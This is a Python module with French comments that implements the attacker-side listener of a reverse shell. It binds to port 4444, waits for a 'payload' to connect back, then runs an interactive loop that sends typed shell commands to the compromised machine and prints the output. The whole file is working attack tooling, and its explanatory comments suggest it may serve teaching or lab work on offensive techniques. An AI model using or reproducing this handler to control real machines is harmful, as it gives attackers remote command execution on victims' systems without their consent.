"""
Reverse Shell Handler Module
Serveur d'écoute côté attaquant
"""

import socket
from typing import Optional, Tuple


class ReverseShellHandler:
    """
    Handler (Listener) : Côté Attaquant
    Écoute les connexions et envoie des commandes au payload
    """

    def __init__(self, port: int = 4444):
        """
        Initialise le handler

        Args:
            port: Port d'écoute (défaut: 4444)
        """
        self.port = port
        self.server_socket: Optional[socket.socket] = None
        self.client_socket: Optional[socket.socket] = None
        self.client_addr: Optional[Tuple[str, int]] = None

    def demarrer(self) -> bool:
        """
        Démarre le handler et attend une connexion

        Returns:
            True si succès, False sinon
        """
        try:
            # Créer socket serveur
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Permettre réutilisation du port (SO_REUSEADDR)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            # Lier à toutes les interfaces (0.0.0.0) et port spécifié
            self.server_socket.bind(('0.0.0.0', self.port))

            # Écouter (backlog=5 = max 5 connexions en attente)
            self.server_socket.listen(5)

            print(f"\n[HANDLER] Démarré sur 0.0.0.0:{self.port}")
            print(f"[HANDLER] En attente de connexion du payload...")

            # Accepter une connexion (BLOQUE jusqu'à client)
            self.client_socket, self.client_addr = self.server_socket.accept()

            print(f"[HANDLER] Payload connecté depuis {self.client_addr[0]}:{self.client_addr[1]}")
            return True

        except Exception as e:
            print(f"[ERREUR HANDLER] Impossible de démarrer: {e}")
            return False

    def boucle_interactive(self):
        """
        Boucle interactive pour envoyer des commandes et recevoir résultats
        """
        if not self.client_socket:
            print("[ERREUR] Pas de client connecté")
            return

        print("\n[HANDLER] Boucle interactive (tapez 'exit' pour quitter)")
        print("-" * 70)

        try:
            while True:
                # Afficher prompt
                commande = input("\n[shell] > ").strip()

                # Vérifier exit
                if commande.lower() in ['exit', 'quit', 'bye']:
                    print("[HANDLER] Fermeture de la session...")
                    break

                # Vérifier commande vide
                if not commande:
                    continue

                # Envoyer commande au payload
                try:
                    self.client_socket.send(commande.encode('utf-8') + b'\n')
                except Exception as e:
                    print(f"[ERREUR] Impossible d'envoyer commande: {e}")
                    break

                # Recevoir résultats (bloque jusqu'à 4096 bytes)
                try:
                    resultats = self.client_socket.recv(4096).decode('utf-8')

                    if resultats:
                        print(resultats, end='')
                    else:
                        print("[HANDLER] Connexion fermée par le client")
                        break

                except Exception as e:
                    print(f"[ERREUR] Impossible de recevoir résultats: {e}")
                    break

        except KeyboardInterrupt:
            print("\n[HANDLER] Interruption utilisateur")

        finally:
            self.fermer()

    def fermer(self):
        """Ferme les connexions proprement"""
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        print("[HANDLER] Sockets fermées")
